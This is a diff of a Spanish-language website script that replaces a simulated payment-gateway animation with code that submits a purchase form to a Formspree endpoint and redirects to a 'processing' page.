@@ -1,45 +1,33 @@
-﻿document.addEventListener('DOMContentLoaded', () => {
+// script.js
+document.addEventListener("DOMContentLoaded", () => {
   const form = document.querySelector("form");
-  const formularioCompra = document.getElementById('formulario-compra');
-  const pasarelaSimulada = document.getElementById('pasarela-simulada');
-  const pagoStatus = document.querySelector('.status-info');
 
   if (form) {
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault(); 
-      
-      const formData = new FormData(form);
-      console.log("Datos del formulario a enviar:", Object.fromEntries(formData.entries()));
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
 
-      // Añade una pequeña animación antes de ocultar el formulario
-      formularioCompra.style.opacity = '0';
-      setTimeout(() => {
-        formularioCompra.classList.add('oculto');
-        pasarelaSimulada.classList.remove('oculto');
-        pasarelaSimulada.style.opacity = '1';
-      }, 300); // Coincide con la duración de la transición CSS
+      // Capturar los datos del formulario
+      const formData = new FormData(form);
+
+      // Enviar a Formspree
+      fetch("https://formspree.io/f/xkgvlbgr", {
+        method: "POST",
+        body: formData,
+        headers: {
+          Accept: "application/json",
+        },
+      })
+        .then((response) => {
+          if (response.ok) {
+            // Redirigir a la página "Procesando"
+            window.location.href = "procesando.html";
+          } else {
+            alert("Hubo un error al enviar el formulario. Inténtalo de nuevo.");
+          }
+        })
+        .catch(() => {
+          alert("Error de conexión. Verifica tu internet.");
+        });
     });
   }
-
-  window.simularPago = (estado) => {
-    pagoStatus.textContent = `Procesando pago...`;
-    
-    setTimeout(() => {
-      if (estado === 'exitoso') {
-        pagoStatus.textContent = '¡Pago exitoso! Redirigiendo...';
-        alert('¡Tu pago ha sido procesado con éxito!');
-      } else {
-        pagoStatus.textContent = 'Pago fallido. Inténtalo de nuevo.';
-        alert('Hubo un problema con el pago. Por favor, inténtalo de nuevo.');
-        
-        // Vuelve a mostrar el formulario con una transición
-        pasarelaSimulada.style.opacity = '0';
-        setTimeout(() => {
-          pasarelaSimulada.classList.add('oculto');
-          formularioCompra.classList.remove('oculto');
-          formularioCompra.style.opacity = '1';
-        }, 300);
-      }
-    }, 2000);
-  };
 });
